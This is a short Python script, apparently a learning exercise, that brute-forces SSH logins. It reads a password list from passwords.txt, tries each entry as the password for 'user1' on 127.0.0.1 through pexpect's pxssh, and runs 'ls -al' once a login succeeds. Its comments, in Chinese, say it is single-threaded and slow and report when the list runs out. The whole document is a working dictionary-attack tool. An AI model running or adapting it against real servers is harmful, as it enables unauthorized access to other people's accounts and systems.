#没开多线程，一个一个弄，很慢
from pexpect import pxssh


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before.decode())

def connect(host, user, password):
    s = pxssh.pxssh()
    s.login(host, user, password)
    return s


def main():
    with open('passwords.txt', 'r') as t:
        lines_list = t.readlines()
        for line in lines_list:
            try: 
                s = connect('127.0.0.1', 'user1', line)
            except KeyboardInterrupt:
                print("GOODBYE")
                exit()
            except:
                print('Error Connect')
            else:
                break
    try:
        send_command(s, 'ls -al')
    except:
        print('字典查阅完毕，无对应密码')


if __name__ == '__main__':
    main()
